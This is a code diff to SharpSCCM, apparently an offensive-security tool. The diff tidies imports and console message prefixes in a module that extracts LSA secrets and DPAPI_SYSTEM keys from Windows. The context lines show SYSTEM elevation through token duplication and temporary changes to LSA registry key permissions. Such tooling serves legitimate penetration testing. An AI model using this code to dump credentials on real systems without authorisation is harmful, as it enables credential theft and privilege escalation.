@@ -1,20 +1,10 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.ComponentModel;
-using System.Diagnostics;
-using System.IO;
-using System.Linq;
 using System.Runtime.InteropServices;
-using System.Security.Principal;
-using System.Text.RegularExpressions;
 using System.Text;
-using System.Security.Cryptography;
-using System.Collections;
 using Microsoft.Win32;
 using System.Security.AccessControl;
-using System.Data;
-using System.Runtime.InteropServices.ComTypes;
-using System.Net;
 
 namespace SharpSCCM
 {
@@ -49,9 +39,9 @@ namespace SharpSCCM
 
             if (show)
             {
-                Console.WriteLine("[*] Secret  : DPAPI_SYSTEM");
-                Console.WriteLine("[*]    full: {0}", BitConverter.ToString(dpapiKeyFull).Replace("-", ""));
-                Console.WriteLine("[*]    m/u : {0} / {1}\r\n", BitConverter.ToString(dpapiKeyMachine).Replace("-", ""), BitConverter.ToString(dpapiKeyUser).Replace("-", ""));
+                Console.WriteLine("[+] Secret: DPAPI_SYSTEM");
+                Console.WriteLine("    full: {0}", BitConverter.ToString(dpapiKeyFull).Replace("-", ""));
+                Console.WriteLine("     m/u: {0} / {1}", BitConverter.ToString(dpapiKeyMachine).Replace("-", ""), BitConverter.ToString(dpapiKeyUser).Replace("-", ""));
             }
 
             return dpapiKeys;
@@ -82,7 +72,7 @@ namespace SharpSCCM
 
             if (!Helpers.IsHighIntegrity())
             {
-                Console.WriteLine("[X] You need to be in high integrity to extract LSA secrets!");
+                Console.WriteLine("[!] You need to be in high integrity to extract LSA secrets!");
                 return null;
             }
             else
@@ -97,17 +87,16 @@ namespace SharpSCCM
                 else if ((reg == false) && (alreadySystem == false))
                 {
                     // elevated but not system, so gotta GetSystem() first
-                    Console.WriteLine("[*] Elevating to SYSTEM via token duplication for LSA secret retrieval");
+                    Console.WriteLine("[+] Elevating to SYSTEM via token duplication for LSA secret retrieval");
                     Helpers.GetSystem();
                 }
 
                 // If we're not system and we don't want to escalate, modify the LSA secrets reg key permissions instead
                 else if ((reg == true) && (alreadySystem == false))
                 {
-                    Console.WriteLine("\r\n");
                     foreach (string key in LsaRegKeys)
                     {
-                        Console.WriteLine("[*] Modifying permissions on registry key: {0}", key);
+                        Console.WriteLine("[+] Modifying permissions on registry key: {0}", key);
 
                         // Backup the current ACL
                         originalAcl = Registry.LocalMachine.OpenSubKey(key, RegistryKeyPermissionCheck.ReadWriteSubTree, System.Security.AccessControl.RegistryRights.ReadPermissions).GetAccessControl();
@@ -153,18 +142,18 @@ namespace SharpSCCM
             {
                 foreach (string key in LsaRegKeys)
                 {
-                    Console.WriteLine("[*] Reverting permissions on registry key: {0}", key);
+                    Console.WriteLine("[+] Reverting permissions on registry key: {0}", key);
                     revertedAcl = newAcl;
                     newRule = new RegistryAccessRule(currentName, RegistryRights.ReadKey, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Allow);
                     revertedAcl.RemoveAccessRule(newRule);
                     Registry.LocalMachine.OpenSubKey(key, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.ChangePermissions).SetAccessControl(revertedAcl);
                 }
-                Console.WriteLine("\r\n");
+                Console.WriteLine();
             }
 
             if ((!alreadySystem) && (!reg))
             {
-                Console.WriteLine("[*] RevertToSelf()\r\n");
+                Console.WriteLine("[+] RevertToSelf()\r\n");
                 Interop.RevertToSelf();
             }
 
@@ -176,7 +165,7 @@ namespace SharpSCCM
             }
             else
             {
-                Console.WriteLine("[X] LSA Secret '{0}' not yet implemented!", secretName);
+                Console.WriteLine("[!] LSA Secret '{0}' not yet implemented!", secretName);
                 return null;
             }
         }
@@ -231,7 +220,7 @@ namespace SharpSCCM
                 {
                     int error = Marshal.GetLastWin32Error();
                     string errorMessage = new Win32Exception((int)error).Message;
-                    Console.WriteLine("Error opening {0} ({1}) : {2}", keyPath, error, errorMessage);
+                    Console.WriteLine("[!] Error opening {0} ({1}) : {2}", keyPath, error, errorMessage);
                     return null;
                 }
 
@@ -240,7 +229,7 @@ namespace SharpSCCM
                 {
                     int error = Marshal.GetLastWin32Error();
                     string errorMessage = new Win32Exception((int)error).Message;
-                    Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, error, errorMessage);
+                    Console.WriteLine("[!] Error enumerating {0} ({1}) : {2}", keyPath, error, errorMessage);
                     return null;
                 }
                 Interop.RegCloseKey(hKey);
